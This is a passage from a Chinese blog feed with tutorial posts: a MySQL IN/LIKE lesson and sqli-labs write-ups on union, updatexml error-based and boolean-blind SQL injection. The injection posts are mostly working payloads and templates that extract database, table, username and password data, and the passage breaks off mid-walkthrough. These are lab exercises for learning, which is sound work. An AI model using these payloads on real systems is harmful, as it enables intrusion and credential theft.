<h1 id="七-获取字段信息"><a href="#七-获取字段信息" class="headerlink" title="七.获取字段信息"></a>七.获取字段信息</h1><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">?id=<span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> from users --+<br></code></pre></td></tr></table></figure>
<p>这里是username,password的信息，3是该表中有三列，from 为从users中获取的<br><img src="https://img-blog.csdnimg.cn/20210205170105883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210205170124355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获取成功了！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>union注入是最简单方便的,但是要求页面必须有显示位,没有就没法利用，在学习sql注入的道路上我们才刚刚起步，加油吧少年！</p>
]]></content>
  </entry>
  <entry>
    <title>mysql-IN和LIKE的使用</title>
    <url>/2021/06/05/mysql-IN%E5%92%8CLIKE%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ol>
<li>掌握运算符in的使用</li>
<li>掌握运算符like的使用</li>
</ol>
<h1 id="一、运算符in的使用"><a href="#一、运算符in的使用" class="headerlink" title="一、运算符in的使用"></a>一、运算符in的使用</h1><p>运算符 IN 允许我们在 WHERE 子句中过滤某个字段的多个值。<br>==where子句使用in语法==<br><code>SELECT column_name FROM table_name WHERE column_name IN(value1, value2, …)</code></p>
<p>适用于多条件查询，使用时更加方便简洁，比如同时查询ID=1,ID=2,ID=3的员工：<br><code>select * from employee where id in(123);</code><br><img src="https://img-blog.csdnimg.cn/20210518200902530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二、运算符like的使用"><a href="#二、运算符like的使用" class="headerlink" title="二、运算符like的使用"></a>二、运算符like的使用</h1><p>在where子句中，有时候我们需要查询包含xxx 字符串的所有记录，这时就需要用到运算符like。<br>==where子句使用like语法==</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">LIKE</span> ‘<span class="hljs-operator">%</span><span class="hljs-keyword">value</span><span class="hljs-operator">%</span>’<br></code></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>1、LIKE子句中的%类似于正则表达式中的*，匹配任意0个或多个字符</li>
<li>2、LIKE子句中的_匹配任意单个字符</li>
<li>3、LIKE子句中如果没有%和_，就相当于运算符=的效果</li>
</ul>
<p>比如想要查询名字是<strong>l</strong> 开头的人：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;l%&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210518201317511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>则l开头的人名则全被筛选出来，如果我们想要筛选出来名字是两个字的那么：要用到<code>-</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;l_&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021051820172245.png" alt="在这里插入图片描述"><br>在这里<code>-</code> 充当的是单个字符。</p>
<p>如果<code>%放在前面则可以筛选条件后面的信息</code>，比如筛选名字最后为<strong>g</strong>的人：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210518202033646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同样如果<code>%放在中间的话，则可以筛选出，信息中间部分的条件</code>，比如筛选出性别中间是<strong>o</strong>的人的信息：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> sex <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%o%&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210518202545901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs-报错注入-updatexml报错</title>
    <url>/2021/06/05/sqli-labs-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>union注入是最简单方便的,但是要求页面必须有显示位,没有就没法利用.</p>
<p>所以当页面没有显示位时,我们需要用其他方法来获取数据.因此我们可以使用报错注入: 有些网站在开发调试阶段开启了报错提示信息,如果没有关闭,就有可能存在报错注入.</p>
<p>报错注入函数:</p>
<ul>
<li>floor函数</li>
<li>extractvalue报错</li>
<li>updatexml报错</li>
</ul>
<p>今天我在这里先记录一下对于<strong>updatexml报错</strong>函数的学习</p>
<h1 id="一、updatexml报错"><a href="#一、updatexml报错" class="headerlink" title="一、updatexml报错"></a>一、updatexml报错</h1><p>基本格式: <code>?id=1  and updatexml(1,(payload),1)</code><br>举例:    <code>?id=1 and  updatexml(1, (concat(0x7e,(select @@version),0x7e)),1)</code></p>
<p>在这里我们以sql-labs第五关进行操作：<br><strong>payload：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="hljs-string">2.?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),0x7e),1) --+</span><br><span class="hljs-string">4.?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210314160622261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到是没有显示位的，因此不能进行联合查询注入-我们选择<strong>报错注入</strong></p>
<p><strong>判断注入点</strong><br>当and 1=1 or and 1=2 时都显示不变<br><img src="https://img-blog.csdnimg.cn/20210314161148263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此输入：<code>?id=1 &#39;</code>判断<img src="https://img-blog.csdnimg.cn/20210314161311827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>确定注入类型为字符型注入</p>
<p><strong>回显</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210314161801691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210314161910353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆表名</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =&#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),0x7e),1) --+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210314162338958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆用户名</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210314162538479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆密码</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210314162631676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二、updatexml报错记忆"><a href="#二、updatexml报错记忆" class="headerlink" title="二、updatexml报错记忆"></a>二、updatexml报错记忆</h1><p>操作一遍大家可以发现其实语法并不难，很便于记住：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select /*payload*/),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
<p>在回显中以及爆数据库这两步只需要改变/<em>payload</em>/即可</p>
<p>爆表名虽然有一丢多：<code>?id=1 &#39; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39; limit 0,1),0x7e),1) --+</code></p>
<p>那么爆用户名以及密码基本不需要怎么改变：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(/*payload*/) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
<p>同样这两步也只需要改变/<em>payload</em>/</p>
<p>其实这个多敲几遍也就记住了     –.–</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs第八关-布尔注入 (1)</title>
    <url>/2021/06/05/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%20(1)/</url>
    <content><![CDATA[</font>

<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><ul>
<li><p>如果页面既没有显示位,也没有报错提示的话,可以使用布尔注入.</p>
</li>
<li><p>通过插入一些语句查看结果来判断是否存在布尔注入.</p>
</li>
<li><p>布尔注入的几个常用函数</p>
<p>函数使用：</p>
</li>
<li><p>length(select database())&gt;5  #length()里可以放查询语句,用来判断查询结果的长度</p>
</li>
<li><p>exists( )      #exists()里可以放查询语句,用来判断查询结果是否存在</p>
</li>
<li><p>ascii( )     #ascii()里可以放查询语句,用来把查询结果转换为ascii的值</p>
</li>
<li><p>substr( string,pos,length)<br>#用来截取查询结果,string可以用查询语句代替,pos表示截取位置–下标从1开始,length表示截取的长度;</p>
</li>
</ul>
<h1 id="一、第八关"><a href="#一、第八关" class="headerlink" title="一、第八关"></a>一、第八关</h1><p><img src="https://img-blog.csdnimg.cn/20210329201547292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>判断注入点</strong><br><img src="https://img-blog.csdnimg.cn/20210329201721382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210329201737515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以发现这里不存在整型注入<br><img src="https://img-blog.csdnimg.cn/20210329201819870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有显示位，可判断为字符型注入</p>
<h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><h3 id="判断长度"><a href="#判断长度" class="headerlink" title="判断长度"></a>判断长度</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database())&gt;1 --+</span><br></code></pre></td></tr></table></figure>
<p>依次往上加数字的值直到无显示位<img src="https://img-blog.csdnimg.cn/20210329203042374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到数据库的长度为8</p>
<h3 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((database()),1,1)) =115 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210329203643704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到当ascll值为115时回显说明第一个字符为‘s’剩下的字符依次进行解密，当然这样比较麻烦.<br>第二位：<code>?id=1&#39; and ascii(substr((database()),2,1)) &gt;80 --+</code><br>类似这样只需修改数值依次解出：database=security<br>大致可以猜测到数据库名：security</p>
<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><h3 id="判断表的长度"><a href="#判断表的长度" class="headerlink" title="判断表的长度"></a>判断表的长度</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3  --+   (结果为4)</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330194218645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210330194246967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>表的数量为4</p>
<h3 id="判断第一个表的长度"><a href="#判断第一个表的长度" class="headerlink" title="判断第一个表的长度"></a>判断第一个表的长度</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+(结果为6)</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330194409911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="判断表的字符"><a href="#判断表的字符" class="headerlink" title="判断表的字符"></a>判断表的字符</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),1,1)) &gt;79 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330191716450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说明表中第一个字符的ASCII值大于79</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330194816879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个值为：e，看一下解释如何往下进行<img src="https://img-blog.csdnimg.cn/20210330194950496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再第一张表中我们只需要修改红字部分进行注入</p>
<p><img src="https://img-blog.csdnimg.cn/20210330195034577.png" alt="在这里插入图片描述"><br>第二个字符为m：<code>?id=1&#39;   and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+</code><img src="https://img-blog.csdnimg.cn/20210330195148544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就这样依次进行得到表名：emails/users</p>
<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><h3 id="获取字段列数"><a href="#获取字段列数" class="headerlink" title="获取字段列数"></a>获取字段列数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and  (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1)=3 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330195445767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210330195506470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见列数为：3</p>
<h3 id="获取字段列名"><a href="#获取字段列名" class="headerlink" title="获取字段列名"></a>获取字段列名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;</span>users<span class="hljs-string">&#x27; and table_schema = &#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),1,1))=105 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330200054898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一列第一个字符为：i<br>继续第二个：d<br><code>?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name = &#39;users&#39; and table_schema = &#39;security&#39; limit 0,1),2,1))=100 --+</code><img src="https://img-blog.csdnimg.cn/2021033020013693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>依次求第二列：<br>第一个字符：u<br><code>?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name = &#39;users&#39; and table_schema = &#39;security&#39; limit 1,1),1,1))=117 --+</code><br><img src="https://img-blog.csdnimg.cn/20210330200247363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021033020032721.png" alt="在这里插入图片描述"><br>换列则需要改变第一个红标处，列中数据改变则需要改变第二个红标处<br>可以得到:<br><strong>第二列名：username<br>第三列名：password</strong></p>
<h2 id="获取表中的数据"><a href="#获取表中的数据" class="headerlink" title="获取表中的数据"></a>获取表中的数据</h2><h3 id="获取条数"><a href="#获取条数" class="headerlink" title="获取条数"></a>获取条数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and  (select count(*) from users)=13 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330201331313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见为13条。</p>
<h3 id="判断数据长度"><a href="#判断数据长度" class="headerlink" title="判断数据长度"></a>判断数据长度</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and  length((select id from users limit 0,1))=1 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330201813227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>获取数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210330202004790.png" alt="在这里插入图片描述"><br>获取username中数据<br><img src="https://img-blog.csdnimg.cn/20210330202350766.png" alt="在这里插入图片描述"><br>获取password中数据<br><img src="https://img-blog.csdnimg.cn/2021033020204216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见账号为Dumb  密码为Dumb</p>
<h3 id="判断长度-1"><a href="#判断长度-1" class="headerlink" title="判断长度"></a>判断长度</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and  length((select username from users limit 0,1))=4 --+</span><br></code></pre></td></tr></table></figure>
<p>可见username的长度为4<br><img src="https://img-blog.csdnimg.cn/20210330202534322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="判断数据"><a href="#判断数据" class="headerlink" title="判断数据"></a>判断数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and ascii(substr((select username from users limit 0,1),1,1))=68 --+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
